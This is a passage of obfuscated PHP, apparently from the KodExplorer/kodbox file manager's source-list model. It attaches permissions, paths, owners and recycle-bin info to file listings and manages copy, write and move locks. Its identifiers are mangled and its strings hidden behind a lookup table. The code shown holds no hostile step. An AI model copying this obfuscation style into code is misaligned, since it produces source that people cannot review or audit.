$û™ìÉÆô[$é‡ºåœ[184]] = json_decode($û™ìÉÆô[$é‡ºåœ[533]][$é‡ºåœ[184]], !0); unset($û™ìÉÆô[$é‡ºåœ[533]][$é‡ºåœ[184]]); } } unset($û™ìÉÆô); } protected function _listAppendSourceInfo(&$Ó“ï¯šÇ, $ºàáÇ­Õ) { $ôˆäÑÑó =& $_SERVER[Õò”†—·]; $ŠÙİöŠ = Model($ôˆäÑÑó[534])->listData(); $Ü—¯¼É = Model($ôˆäÑÑó[483])->listData(); $°£¢Š’ı = Model($ôˆäÑÑó[473])->listData(); $ïëîüøª = Model($ôˆäÑÑó[535])->listSimple(); $Œ‡“©Áì = array_to_keyvalue($ŠÙİöŠ, $ôˆäÑÑó[459]); $Á›§åÛä = array_to_keyvalue_group($Ü—¯¼É, $ôˆäÑÑó[97], $ôˆäÑÑó[484]); $ÀÚË‚‚Ÿ = array_to_keyvalue($°£¢Š’ı, $ôˆäÑÑó[97]); $êä©ÂÔ­ = array_to_keyvalue_group($ïëîüøª, $ôˆäÑÑó[194]); foreach ($Ó“ï¯šÇ as &$Ìú“²üµ) { $Ìú“²üµ[$ôˆäÑÑó[100]] = array($ôˆäÑÑó[536] => 0, $ôˆäÑÑó[537] => 0, $ôˆäÑÑó[538] => 0); if (isset($ÀÚË‚‚Ÿ[$Ìú“²üµ[$ôˆäÑÑó[194]]])) { $Ìú“²üµ[$ôˆäÑÑó[100]][$ôˆäÑÑó[539]] = 1; $Ìú“²üµ[$ôˆäÑÑó[100]][$ôˆäÑÑó[540]] = $ÀÚË‚‚Ÿ[$Ìú“²üµ[$ôˆäÑÑó[194]]][$ôˆäÑÑó[42]]; } if ($Á›§åÛä && $Œ‡“©Áì && isset($Á›§åÛä[$Ìú“²üµ[$ôˆäÑÑó[194]]])) { $Ìú“²üµ[$ôˆäÑÑó[100]][$ôˆäÑÑó[541]] = array(); foreach ($Á›§åÛä[$Ìú“²üµ[$ôˆäÑÑó[194]]] as $”šÈ¡æƒ) { $¹÷çÖ¨¦ = $Œ‡“©Áì[$”šÈ¡æƒ]; $Ìú“²üµ[$ôˆäÑÑó[100]][$ôˆäÑÑó[541]][] = array($ôˆäÑÑó[542] => $¹÷çÖ¨¦[$ôˆäÑÑó[459]], $ôˆäÑÑó[478] => $¹÷çÖ¨¦[$ôˆäÑÑó[42]], $ôˆäÑÑó[543] => $¹÷çÖ¨¦[$ôˆäÑÑó[544]]); } } if ($êä©ÂÔ­ && isset($êä©ÂÔ­[$Ìú“²üµ[$ôˆäÑÑó[194]]])) { $Ìú“²üµ[$ôˆäÑÑó[100]][$ôˆäÑÑó[545]] = array(); foreach ($êä©ÂÔ­[$Ìú“²üµ[$ôˆäÑÑó[194]]] as $¯±éôŞƒ) { $†¯µ™Âå = $ôˆäÑÑó[546]; if ($¯±éôŞƒ[$ôˆäÑÑó[547]] == $ôˆäÑÑó[101]) { $†¯µ™Âå .= $ôˆäÑÑó[548]; } $Ìú“²üµ[$ôˆäÑÑó[100]][$ôˆäÑÑó[545]] = array_field_key($¯±éôŞƒ, explode($ôˆäÑÑó[60], $†¯µ™Âå)); } } } unset($Ìú“²üµ); return $Ó“ï¯šÇ; } protected function _listAppendChildren(&$ÇÈß, $¥‰ìæûû) { $æïÎşû¡ =& $_SERVER[Õò”†—·]; $ñëÕ¼‚Ú = array(); $íà—ıü… = array($æïÎşû¡[240] => 0, $æïÎşû¡[241] => 0); foreach ($ÇÈß as &$Š¸‘¿Í) { if (!$Š¸‘¿Í[$æïÎşû¡[469]]) { continue; } $ñëÕ¼‚Ú[] = $Š¸‘¿Í[$æïÎşû¡[194]]; } unset($Š¸‘¿Í); if (!$ñëÕ¼‚Ú) { return; } $„îì¦ÄÆ = array($æïÎşû¡[193] => array($æïÎşû¡[17], $ñëÕ¼‚Ú), $æïÎşû¡[489] => 0); $’Æ¥­ó = array($æïÎşû¡[193], $æïÎşû¡[469], $æïÎşû¡[549] => $æïÎşû¡[550]); $ûÂğ¹õ’ = $this->field($’Æ¥­ó)->where($„îì¦ÄÆ)->group($æïÎşû¡[551])->select(); $Èğùù–ú = array(); foreach ($ûÂğ¹õ’ as $ÖíÔÁú) { $¯„îÒä³ = $ÖíÔÁú[$æïÎşû¡[193]]; $–„Ïšş = $ÖíÔÁú[$æïÎşû¡[469]] == $æïÎşû¡[101] ? $æïÎşû¡[241] : $æïÎşû¡[240]; if (!isset($Èğùù–ú[$¯„îÒä³])) { $Èğùù–ú[$¯„îÒä³] = array($æïÎşû¡[240] => 0, $æïÎşû¡[241] => 0); } $Èğùù–ú[$¯„îÒä³][$–„Ïšş] += $ÖíÔÁú[$æïÎşû¡[550]]; } foreach ($ÇÈß as &$Š¸‘¿Í) { if (!$Š¸‘¿Í[$æïÎşû¡[469]]) { continue; } $æØ½¬­Ç = is_array($Èğùù–ú[$Š¸‘¿Í[$æïÎşû¡[194]]]) ? $Èğùù–ú[$Š¸‘¿Í[$æïÎşû¡[194]]] : $íà—ıü…; $Š¸‘¿Í[$æïÎşû¡[241]] = $æØ½¬­Ç[$æïÎşû¡[241]]; $Š¸‘¿Í[$æïÎşû¡[240]] = $æØ½¬­Ç[$æïÎşû¡[240]]; unset($Š¸‘¿Í[$æïÎşû¡[470]]); } unset($Š¸‘¿Í); } protected function _listAppendAuth(&$ö†Ô¥’¹) { $¹ãÑ£¯ =& $_SERVER[Õò”†—·]; $éÒª½¥š = array(); foreach ($ö†Ô¥’¹ as $¡Í•À‹“) { if ($¡Í•À‹“[$¹ãÑ£¯[191]] == self::TYPE_GROUP) { $éÒª½¥š[] = $¡Í•À‹“[$¹ãÑ£¯[194]]; } } if (!$éÒª½¥š) { return; } $ƒÇ¥ˆ«à = array_to_keyvalue($ö†Ô¥’¹, $¹ãÑ£¯[194]); $¾Õ·ê“ = Model($¹ãÑ£¯[552])->getSourceList($éÒª½¥š, $ƒÇ¥ˆ«à); $ƒ€–ñşš = KodUser::isRoot(); foreach ($ö†Ô¥’¹ as $©Å©ıÄ => &$¡Í•À‹“) { $¡Í•À‹“[$¹ãÑ£¯[471]] = $¾Õ·ê“[$¡Í•À‹“[$¹ãÑ£¯[194]]]; if (!$¡Í•À‹“[$¹ãÑ£¯[471]] && $¡Í•À‹“[$¹ãÑ£¯[191]] == self::TYPE_GROUP) { $¡Í•À‹“[$¹ãÑ£¯[471]] = Action($¹ãÑ£¯[553])->pathGroupAuthMake($¡Í•À‹“[$¹ãÑ£¯[554]]); if (!$¡Í•À‹“[$¹ãÑ£¯[471]] && !$ƒ€–ñşš) { $¡Í•À‹“[$¹ãÑ£¯[234]] = !1; $¡Í•À‹“[$¹ãÑ£¯[233]] = !1; } } if ($¡Í•À‹“[$¹ãÑ£¯[471]]) { $¡Í•À‹“[$¹ãÑ£¯[234]] = AuthModel::authCheckEdit($¡Í•À‹“[$¹ãÑ£¯[471]][$¹ãÑ£¯[472]]); $¡Í•À‹“[$¹ãÑ£¯[233]] = AuthModel::authCheckView($¡Í•À‹“[$¹ãÑ£¯[471]][$¹ãÑ£¯[472]]); } $this->groupPathDisplay($¡Í•À‹“); } unset($¡Í•À‹“); } public function _listAppendAuthSecret(&$Ûì¶ÆØÌ) { $½¡Êõİµ =& $_SERVER[Õò”†—·]; if (Model($½¡Êõİµ[492])->get($½¡Êõİµ[555]) != $½¡Êõİµ[101]) { return; } static $¾¢§‚Ÿ = false; if (!$¾¢§‚Ÿ) { $üÏ¡îóÑ = Model($½¡Êõİµ[556]); $ƒ‰ªµì = Model($½¡Êõİµ[557]); $¾¢§‚Ÿ = $ƒ‰ªµì->listData(); $¾¢§‚Ÿ = array_to_keyvalue($¾¢§‚Ÿ, $½¡Êõİµ[194]); $ëş‹ìßè = json_decode(Model($½¡Êõİµ[492])->get($½¡Êõİµ[558]), !0); $ëş‹ìßè = array_to_keyvalue($ëş‹ìßè, $½¡Êõİµ[459]); foreach ($¾¢§‚Ÿ as $ø£«¤¹ã => $Í¶ˆÓƒ) { $–æˆÏÓó = $ëş‹ìßè[$Í¶ˆÓƒ[$½¡Êõİµ[559]]]; if (!$–æˆÏÓó) { $ƒ‰ªµì->remove($Í¶ˆÓƒ[$½¡Êõİµ[459]]); unset($¾¢§‚Ÿ[$ø£«¤¹ã]); continue; } $ÂŒü‘¨¹ = $üÏ¡îóÑ->listData($–æˆÏÓó[$½¡Êõİµ[471]]); if (!$ÂŒü‘¨¹) { $ƒ‰ªµì->remove($Í¶ˆÓƒ[$½¡Êõİµ[459]]); unset($¾¢§‚Ÿ[$ø£«¤¹ã]); continue; } $Í¶ˆÓƒ[$½¡Êõİµ[471]] = $ÂŒü‘¨¹; $Í¶ˆÓƒ[$½¡Êõİµ[560]] = $–æˆÏÓó; $Í¶ˆÓƒ[$½¡Êõİµ[561]] = Model($½¡Êõİµ[562])->getInfoSimpleOuter($Í¶ˆÓƒ[$½¡Êõİµ[511]]); $¾¢§‚Ÿ[$ø£«¤¹ã] = $Í¶ˆÓƒ; } } $®¡òİÃ¯ = USER_ID; $„Ø—˜¡ = array(); $­Àù¼– = $this->_listAppendPath($„Ø—˜¡, !0); foreach ($Ûì¶ÆØÌ as $ø£«¤¹ã => &$Í¶ˆÓƒ) { if (!is_array($Í¶ˆÓƒ[$½¡Êõİµ[471]])) { continue; } if ($Í¶ˆÓƒ[$½¡Êõİµ[191]] != $½¡Êõİµ[563]) { continue; } if (isset($¾¢§‚Ÿ[$Í¶ˆÓƒ[$½¡Êõİµ[194]]])) { $³ü²„­ = $¾¢§‚Ÿ[$Í¶ˆÓƒ[$½¡Êõİµ[194]]]; if (!is_array($Í¶ˆÓƒ[$½¡Êõİµ[523]])) { $Í¶ˆÓƒ[$½¡Êõİµ[523]] = array(); } $Í¶ˆÓƒ[$½¡Êõİµ[523]][$½¡Êõİµ[564]] = $³ü²„­[$½¡Êõİµ[559]]; $Í¶ˆÓƒ[$½¡Êõİµ[471]][$½¡Êõİµ[565]] = $³ü²„­; $Í¶ˆÓƒ[$½¡Êõİµ[471]][$½¡Êõİµ[566]] = $Í¶ˆÓƒ[$½¡Êõİµ[567]]; $Í¶ˆÓƒ[$½¡Êõİµ[471]][$½¡Êõİµ[568]] = $½¡Êõİµ[101]; if ($³ü²„­[$½¡Êõİµ[511]] != $®¡òİÃ¯) { $Í¶ˆÓƒ[$½¡Êõİµ[471]][$½¡Êõİµ[472]] = $Í¶ˆÓƒ[$½¡Êõİµ[471]][$½¡Êõİµ[472]] & $³ü²„­[$½¡Êõİµ[471]][$½¡Êõİµ[471]]; } continue; } $õÛ†ˆ¢Ö = $this->parentLevelArray($Í¶ˆÓƒ[$½¡Êõİµ[569]]); $şÓ½»¿¯ = array_reverse($õÛ†ˆ¢Ö); foreach ($şÓ½»¿¯ as $˜©¶£Ï => $ÚÈùØÃĞ) { if (!isset($¾¢§‚Ÿ[$ÚÈùØÃĞ])) { continue; } $³ü²„­ = $¾¢§‚Ÿ[$ÚÈùØÃĞ]; $Í¶ˆÓƒ[$½¡Êõİµ[471]][$½¡Êõİµ[565]] = $³ü²„­; if ($³ü²„­[$½¡Êõİµ[511]] != $®¡òİÃ¯) { $Í¶ˆÓƒ[$½¡Êõİµ[471]][$½¡Êõİµ[472]] = $Í¶ˆÓƒ[$½¡Êõİµ[471]][$½¡Êõİµ[472]] & $³ü²„­[$½¡Êõİµ[471]][$½¡Êõİµ[471]]; } $ìÎ§™·ñ = $½¡Êõİµ[22]; $È–®ŠİÏ = count($õÛ†ˆ¢Ö) - $˜©¶£Ï; for ($ëòØãó = 0; $ëòØãó < $È–®ŠİÏ; $ëòØãó++) { if (!isset($­Àù¼–[$õÛ†ˆ¢Ö[$ëòØãó]])) { $ìÎ§™·ñ = $½¡Êõİµ[22]; break; } $ìÎ§™·ñ = $ìÎ§™·ñ . rtrim($­Àù¼–[$õÛ†ˆ¢Ö[$ëòØãó]], $½¡Êõİµ[18]) . $½¡Êõİµ[18]; } $Í¶ˆÓƒ[$½¡Êõİµ[471]][$½¡Êõİµ[566]] = rtrim($ìÎ§™·ñ, $½¡Êõİµ[18]) . $½¡Êõİµ[18]; break; } } unset($Í¶ˆÓƒ); } public function groupPathDisplay(&$ÍŒÔóÙÁ) { $‘ŞÂ¤›ı =& $_SERVER[Õò”†—·]; if ($ÍŒÔóÙÁ[$‘ŞÂ¤›ı[191]] != self::TYPE_GROUP) { return; } $ûÖúùó = Model($‘ŞÂ¤›ı[570])->getInfo($ÍŒÔóÙÁ[$‘ŞÂ¤›ı[554]]); $ŒÏğåÅš = $this->parentLevelArray($ûÖúùó[$‘ŞÂ¤›ı[569]]); $Ú°í©¶€ = $‘ŞÂ¤›ı[22]; foreach ($ŒÏğåÅš as $Äæ„Éˆğ) { $©’±êÃ´ = Model($‘ŞÂ¤›ı[570])->getInfo($Äæ„Éˆğ); $Ú°í©¶€ .= $©’±êÃ´[$‘ŞÂ¤›ı[100]][$‘ŞÂ¤›ı[194]] . $‘ŞÂ¤›ı[60]; } $ÍŒÔóÙÁ[$‘ŞÂ¤›ı[571]] = $ûÖúùó[$‘ŞÂ¤›ı[193]]; $ÍŒÔóÙÁ[$‘ŞÂ¤›ı[572]] = $ûÖúùó[$‘ŞÂ¤›ı[569]]; $ÍŒÔóÙÁ[$‘ŞÂ¤›ı[573]] = $ûÖúùó[$‘ŞÂ¤›ı[574]]; $ÍŒÔóÙÁ[$‘ŞÂ¤›ı[575]] = $Ú°í©¶€ . $ûÖúùó[$‘ŞÂ¤›ı[100]][$‘ŞÂ¤›ı[194]]; } protected function _listAppendPath(&$«ÔÃëß, $¸ÚøâĞ¦ = false) { $´®­Úø =& $_SERVER[Õò”†—·]; static $‹Å™¥ş = array(); $Ñµ¢Ù­¨ = array(); $Ä§è­ÊÅ = array(); if ($¸ÚøâĞ¦) { return $‹Å™¥ş; } foreach ($«ÔÃëß as &$“¢ŞÈœÏ) { $Ì›Šß‡¨ = $“¢ŞÈœÏ[$´®­Úø[194]]; if ($“¢ŞÈœÏ[$´®­Úø[469]] == $´®­Úø[101] && $“¢ŞÈœÏ[$´®­Úø[193]] != 0) { $‹Å™¥ş[$Ì›Šß‡¨] = $“¢ŞÈœÏ[$´®­Úø[42]]; } if ($“¢ŞÈœÏ[$´®­Úø[469]] == $´®­Úø[101] && $“¢ŞÈœÏ[$´®­Úø[193]] == 0) { $‹Å™¥ş[$Ì›Šß‡¨] = $this->_listAppendPathRoot($“¢ŞÈœÏ, array()); } if (isset($Ä§è­ÊÅ[$“¢ŞÈœÏ[$´®­Úø[569]]])) { continue; } $Ä§è­ÊÅ[$“¢ŞÈœÏ[$´®­Úø[569]]] = !0; $ÃË…ÃÊŸ = $this->parentLevelArray($“¢ŞÈœÏ[$´®­Úø[569]]); foreach ($ÃË…ÃÊŸ as $şÃßº“† => $âóÇÈÑ) { if (isset($‹Å™¥ş[$âóÇÈÑ])) { continue; } if ($şÃßº“† == 0) { $‹Å™¥ş[$âóÇÈÑ] = $this->_listAppendPathRoot($“¢ŞÈœÏ, $ÃË…ÃÊŸ); } if ($şÃßº“† != 0) { $Ñµ¢Ù­¨[] = $âóÇÈÑ; } } } unset($“¢ŞÈœÏ); $Ñµ¢Ù­¨ = array_unique($Ñµ¢Ù­¨); if (count($Ñµ¢Ù­¨) > 0) { $ğÒÓµ†¯ = array($´®­Úø[475] => array($´®­Úø[476], $Ñµ¢Ù­¨)); if (count($Ñµ¢Ù­¨) == 1) { $¼”¦“«õ = $this->sourceInfo($Ñµ¢Ù­¨[0]); $áìú¨ñ³ = is_array($¼”¦“«õ) ? array($¼”¦“«õ) : !1; } else { $áìú¨ñ³ = $this->field($´®­Úø[576])->where($ğÒÓµ†¯)->select(); } if (!$áìú¨ñ³) { $áìú¨ñ³ = array(); } foreach ($áìú¨ñ³ as $ì¿¡Çø–) { $‹Å™¥ş[$ì¿¡Çø–[$´®­Úø[194]]] = $ì¿¡Çø–[$´®­Úø[42]]; } } $ÄµêÑœ¬ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $´–¬ ˜¸ = array(); foreach ($«ÔÃëß as &$“¢ŞÈœÏ) { $€Øîä¬Ê = $“¢ŞÈœÏ[$´®­Úø[569]]; $ì¬ª‚ÍÕ = $´®­Úø[22]; if (isset($´–¬ ˜¸[$€Øîä¬Ê])) { $ì¬ª‚ÍÕ = $´–¬ ˜¸[$€Øîä¬Ê]; } else { $ÃË…ÃÊŸ = $this->parentLevelArray($“¢ŞÈœÏ[$´®­Úø[569]]); foreach ($ÃË…ÃÊŸ as $şÃßº“† => $âóÇÈÑ) { if (isset($‹Å™¥ş[$âóÇÈÑ])) { $ì¬ª‚ÍÕ .= $‹Å™¥ş[$âóÇÈÑ] . $´®­Úø[18]; } } $´–¬ ˜¸[$€Øîä¬Ê] = $ì¬ª‚ÍÕ; } $ì¬ª‚ÍÕ .= $“¢ŞÈœÏ[$´®­Úø[42]]; if ($“¢ŞÈœÏ[$´®­Úø[469]] == $´®­Úø[101]) { $ì¬ª‚ÍÕ .= $´®­Úø[18]; } $“¢ŞÈœÏ[$´®­Úø[567]] = str_replace($´®­Úø[577], $´®­Úø[18], $ì¬ª‚ÍÕ); if ($“¢ŞÈœÏ[$´®­Úø[193]] == $´®­Úø[229]) { $“¢ŞÈœÏ[$´®­Úø[42]] = trim($‹Å™¥ş[$“¢ŞÈœÏ[$´®­Úø[194]]], $´®­Úø[18]); $“¢ŞÈœÏ[$´®­Úø[567]] = $“¢ŞÈœÏ[$´®­Úø[42]] . $´®­Úø[18]; } if (intval($“¢ŞÈœÏ[$´®­Úø[191]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($“¢ŞÈœÏ, $ÃË…ÃÊŸ, $ÄµêÑœ¬); } } unset($“¢ŞÈœÏ); return $«ÔÃëß; } private function _listAppendPathRecycle(&$ëÔíÀ, $¦é×ÄİÈ, $Š€‡¾¹­) { $ÇŞşœõ =& $_SERVER[Õò”†—·]; if (!in_array($Š€‡¾¹­, $¦é×ÄİÈ) && $ëÔíÀ[$ÇŞşœõ[194]] != $Š€‡¾¹­) { return; } $Í¼§°ëï = explode($ÇŞşœõ[18], trim($ëÔíÀ[$ÇŞşœõ[567]], $ÇŞşœõ[18])); $ó††‰€í = implode($ÇŞşœõ[18], array_slice($Í¼§°ëï, 2)); $ëÔíÀ[$ÇŞşœõ[567]] = $ÇŞşœõ[18] . LNG($ÇŞşœõ[578]) . $ÇŞşœõ[18] . ltrim($ó††‰€í, $ÇŞşœõ[18]); $ëÔíÀ[$ÇŞşœõ[569]] = $ÇŞşœõ[579] . implode($ÇŞşœõ[60], array_slice($¦é×ÄİÈ, 1)) . $ÇŞşœõ[60]; if ($ëÔíÀ[$ÇŞşœõ[194]] == $Š€‡¾¹­) { $ëÔíÀ[$ÇŞşœõ[569]] = $ÇŞşœõ[579]; $ëÔíÀ[$ÇŞşœõ[193]] = $ÇŞşœõ[229]; $ëÔíÀ[$ÇŞşœõ[42]] = LNG($ÇŞşœõ[578]); } $ëÔíÀ[$ÇŞşœõ[580]] = $ÇŞşœõ[581]; } protected function _listAppendPathRoot(&$ —ËÅ¼§, $´ä¾òÚà) { $Éõ”‡å¹ =& $_SERVER[Õò”†—·]; static $ŒİÂ¿Ó = false; $±Ó¤ç¿ = $Éõ”‡å¹[22]; if ($ —ËÅ¼§[$Éõ”‡å¹[191]] == self::TYPE_USER) { if ($ —ËÅ¼§[$Éõ”‡å¹[554]] == USER_ID) { $±Ó¤ç¿ = LNG($Éõ”‡å¹[582]); if ($ŒİÂ¿Ó === !1) { $‡óËØ±§ = Model($Éõ”‡å¹[583])->getInfoFull(USER_ID); $ŒİÂ¿Ó = _get($‡óËØ±§, $Éõ”‡å¹[584], $Éõ”‡å¹[22]); } if ($´ä¾òÚà && $´ä¾òÚà[0] == $ŒİÂ¿Ó || !$´ä¾òÚà && $ —ËÅ¼§[$Éõ”‡å¹[194]] == $ŒİÂ¿Ó) { $±Ó¤ç¿ = LNG($Éõ”‡å¹[585]); $ —ËÅ¼§[$Éõ”‡å¹[586]] = $Éõ”‡å¹[587]; } if (!$´ä¾òÚà) { $ —ËÅ¼§[$Éõ”‡å¹[42]] = $±Ó¤ç¿; } } else { $ —ËÅ¼§[$Éõ”‡å¹[588]] = Model($Éõ”‡å¹[562])->getInfoSimpleOuter($ —ËÅ¼§[$Éõ”‡å¹[554]]); $±Ó¤ç¿ = LNG($Éõ”‡å¹[589]) . $Éõ”‡å¹[176] . $ —ËÅ¼§[$Éõ”‡å¹[588]][$Éõ”‡å¹[42]] . $Éõ”‡å¹[178]; } } else { if ($ —ËÅ¼§[$Éõ”‡å¹[191]] == self::TYPE_GROUP) { $Ï‹ü‚‘ = Model($Éõ”‡å¹[570])->getInfoSimple($ —ËÅ¼§[$Éõ”‡å¹[554]]); $±Ó¤ç¿ = $Ï‹ü‚‘[$Éõ”‡å¹[42]]; } else { if ($ —ËÅ¼§[$Éõ”‡å¹[191]] == self::TYPE_SYSTEM) { $±Ó¤ç¿ = $Éõ”‡å¹[590]; } } } $±Ó¤ç¿ = $±Ó¤ç¿ ? $Éõ”‡å¹[18] . $±Ó¤ç¿ . $Éõ”‡å¹[18] : $Éõ”‡å¹[18]; return $±Ó¤ç¿; } protected function _listAppendUser(&$‹÷®ş§æ) { $Ù×³™« =& $_SERVER[Õò”†—·]; $¸’îâ…“ = array_to_keyvalue($‹÷®ş§æ, $Ù×³™«[22], $Ù×³™«[511]); $¥«Ü˜°õ = array_to_keyvalue($‹÷®ş§æ, $Ù×³™«[22], $Ù×³™«[513]); $Şñ‡èÜ÷ = array_merge($¸’îâ…“, $¥«Ü˜°õ); $Ñİìè¬º = Model($Ù×³™«[583])->userListInfo($Şñ‡èÜ÷); foreach ($‹÷®ş§æ as &$×“ó­‘Ö) { $­“€Àé£ = $×“ó­‘Ö[$Ù×³™«[511]]; $×“ó­‘Ö[$Ù×³™«[511]] = $Ñİìè¬º[$­“€Àé£] ? $Ñİìè¬º[$­“€Àé£] : !1; $­“€Àé£ = $×“ó­‘Ö[$Ù×³™«[513]]; $×“ó­‘Ö[$Ù×³™«[513]] = $Ñİìè¬º[$­“€Àé£] ? $Ñİìè¬º[$­“€Àé£] : !1; if (isset($×“ó­‘Ö[$Ù×³™«[523]]) && $×“ó­‘Ö[$Ù×³™«[523]][$Ù×³™«[591]]) { $©¡ØĞ§© = $GLOBALS[$Ù×³™«[16]][$Ù×³™«[102]][$Ù×³™«[592]]; if ($×“ó­‘Ö[$Ù×³™«[523]][$Ù×³™«[593]] <= time() - $©¡ØĞ§©) { $this->metaSet($×“ó­‘Ö[$Ù×³™«[194]], $Ù×³™«[591], null); $this->metaSet($×“ó­‘Ö[$Ù×³™«[194]], $Ù×³™«[593], null); unset($×“ó­‘Ö[$Ù×³™«[523]][$Ù×³™«[591]]); continue; } $©›Éºú = $×“ó­‘Ö[$Ù×³™«[523]][$Ù×³™«[591]]; $×“ó­‘Ö[$Ù×³™«[523]][$Ù×³™«[594]] = Model($Ù×³™«[583])->getInfoSimpleOuter($©›Éºú); } } unset($×“ó­‘Ö); } public function parentLevelArray($ƒ÷ÎåØª) { $‰…¡ç±€ =& $_SERVER[Õò”†—·]; $ƒ÷ÎåØª = explode($‰…¡ç±€[60], trim($ƒ÷ÎåØª, $‰…¡ç±€[60])); return array_remove_value($ƒ÷ÎåØª, $‰…¡ç±€[229]); } public function listAll($îãñ‚ã±) { $¶¸÷ÍÍ… =& $_SERVER[Õò”†—·]; $‹Éô§¼ = $this->sourceInfo($îãñ‚ã±); $‚ŒøŞÇç = array($¶¸÷ÍÍ…[595] => array($¶¸÷ÍÍ…[596], $‹Éô§¼[$¶¸÷ÍÍ…[569]] . $îãñ‚ã± . $¶¸÷ÍÍ…[597]), $¶¸÷ÍÍ…[598] => 0); $—³ºç¨æ = $¶¸÷ÍÍ…[599]; $ÒÖ”Æ‘ = "\114\x45\106\124\40\x4a\x4f\111\x4e\x20{$this->tablePrefix}\151\x6f\x5f\146\151\x6c\x65\x20\146\x69\x6c\145\40\157\156\x20\163\x6f\x75\162\143\x65\x2e\146\151\x6c\x65\x49\104\x20\x3d\40\x66\x69\x6c\x65\x2e\x66\x69\154\145\111\x44"; $¼üèº®› = $this->alias($¶¸÷ÍÍ…[503])->field($—³ºç¨æ)->where($‚ŒøŞÇç)->join($ÒÖ”Æ‘)->select(); $this->_listAppendAuth($¼üèº®›); $this->_listAppendUser($¼üèº®›); $this->_listAppendPath($¼üèº®›); $¼üèº®› = array_to_keyvalue($¼üèº®›, $¶¸÷ÍÍ…[194]); $ğš¤İÀ = "\57{$‹Éô§¼[$¶¸÷ÍÍ…[42]]}\x2f"; $ğš¤İÀ = $ğš¤İÀ == $¶¸÷ÍÍ…[577] ? $¶¸÷ÍÍ…[18] : $ğš¤İÀ; $¶– áâ = array(); foreach ($¼üèº®› as $…¾¥î => $£µ°€îñ) { $ØÄ€óß = $this->parentLevelArray($£µ°€îñ[$¶¸÷ÍÍ…[569]]); array_shift($ØÄ€óß); $İïùµœ¹ = $ğš¤İÀ; for ($¾’ô˜å = 0; $¾’ô˜å < count($ØÄ€óß); $¾’ô˜å++) { $İïùµœ¹ .= $¼üèº®›[$ØÄ€óß[$¾’ô˜å]][$¶¸÷ÍÍ…[42]] . $¶¸÷ÍÍ…[18]; } $İïùµœ¹ .= $£µ°€îñ[$¶¸÷ÍÍ…[42]]; if ($£µ°€îñ[$¶¸÷ÍÍ…[469]]) { $İïùµœ¹ .= $¶¸÷ÍÍ…[18]; } $˜±Ú²¤ = array($¶¸÷ÍÍ…[479] => str_replace($¶¸÷ÍÍ…[577], $¶¸÷ÍÍ…[18], str_replace($¶¸÷ÍÍ…[577], $¶¸÷ÍÍ…[18], str_replace($¶¸÷ÍÍ…[577], $¶¸÷ÍÍ…[18], $İïùµœ¹))), $¶¸÷ÍÍ…[600] => intval($£µ°€îñ[$¶¸÷ÍÍ…[469]]), $¶¸÷ÍÍ…[601] => intval($£µ°€îñ[$¶¸÷ÍÍ…[89]]), $¶¸÷ÍÍ…[98] => intval($£µ°€îñ[$¶¸÷ÍÍ…[98]]), $¶¸÷ÍÍ…[100] => $this->pathInfoFilter($£µ°€îñ)); if (!$˜±Ú²¤[$¶¸÷ÍÍ…[469]]) { $˜±Ú²¤[$¶¸÷ÍÍ…[525]] = $£µ°€îñ[$¶¸÷ÍÍ…[525]]; } $¶– áâ[] = $˜±Ú²¤; } $¶– áâ = array_sort_by($¶– áâ, $¶¸÷ÍÍ…[97]); return $¶– áâ; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($Õ…¬ò”Ğ) { $ÁòúÏ¿ =& $_SERVER[Õò”†—·]; if (!$this->allowLock()) { return; } $this->_lockCheck($ÁòúÏ¿[602], $Õ…¬ò”Ğ); $† ’Šü = 1; $this->_lockEvent($Õ…¬ò”Ğ, array($ÁòúÏ¿[603], $ÁòúÏ¿[604]), $† ’Šü); $this->_lockParent($Õ…¬ò”Ğ, array($ÁòúÏ¿[604]), $† ’Šü); $this->_lockEvent($Õ…¬ò”Ğ, array($ÁòúÏ¿[605], $ÁòúÏ¿[606]), $† ’Šü); $this->_lockCheckEnd($ÁòúÏ¿[602], $Õ…¬ò”Ğ); } public function lockCopyEnd($»Ã±‘¾ñ) { $Ñ¶‡ò‹ =& $_SERVER[Õò”†—·]; if (!$this->allowLock()) { return; } $…–ËæÉÇ = 0; $this->_lockEvent($»Ã±‘¾ñ, array($Ñ¶‡ò‹[603], $Ñ¶‡ò‹[604]), $…–ËæÉÇ); $this->_lockParent($»Ã±‘¾ñ, array($Ñ¶‡ò‹[604]), $…–ËæÉÇ); $this->_lockEvent($»Ã±‘¾ñ, array($Ñ¶‡ò‹[605], $Ñ¶‡ò‹[606]), $…–ËæÉÇ); } public function lockWriteStart($šˆ˜á‡, $Â’ñğş = '') { $³›í Œë =& $_SERVER[Õò”†—·]; if (!$this->allowLock()) { return; } $this->_lockCheck($³›í Œë[603], $šˆ˜á‡); $Ÿ®ñ‘å = 1; $this->_lockKey($³›í Œë[607] . $šˆ˜á‡ . $³›í Œë[20] . $Â’ñğş, $Ÿ®ñ‘å); $this->_lockEvent($šˆ˜á‡, array($³›í Œë[602], $³›í Œë[604]), $Ÿ®ñ‘å); $this->_lockParent($šˆ˜á‡, array($³›í Œë[602], $³›í Œë[604]), $Ÿ®ñ‘å); $this->_lockCheckEnd($³›í Œë[603], $šˆ˜á‡); } public function lockWriteEnd($¼³ä’ı», $‰ôŞ¼£ = '') { $™ÛĞçØƒ =& $_SERVER[Õò”†—·]; if (!$this->allowLock()) { return; } $–ô•´Ê = 0; $this->_lockKey($™ÛĞçØƒ[607] . $¼³ä’ı» . $™ÛĞçØƒ[20] . $‰ôŞ¼£, $–ô•´Ê); $this->_lockEvent($¼³ä’ı», array($™ÛĞçØƒ[602], $™ÛĞçØƒ[604]), $–ô•´Ê); $this->_lockParent($¼³ä’ı», array($™ÛĞçØƒ[602], $™ÛĞçØƒ[604]), $–ô•´Ê); } public function lockMoveStart($¨°­¼Ñ°) { $£óîù€è =& $_SERVER[Õò”†—·]; if (!$this->allowLock()) { return; } $this->_lockCheck($£óîù€è[604], $¨°­¼Ñ°); $°’µ²Ó = 1; $this->_lockKey($£óîù€è[608] . $¨°­¼Ñ°, $°’µ²Ó); $this->_lockEvent($¨°­¼Ñ°, array($£óîù€è[602], $£óîù€è[603]), $°’µ²Ó); $this->_lockParent($¨°­¼Ñ°, array($£óîù€è[602], $£óîù€è[604]), $°’µ²Ó); $this->_lockEvent($¨°­¼Ñ°, array($£óîù€è[609], $£óîù€è[605], $£óîù€è[606]), $°’µ²Ó); 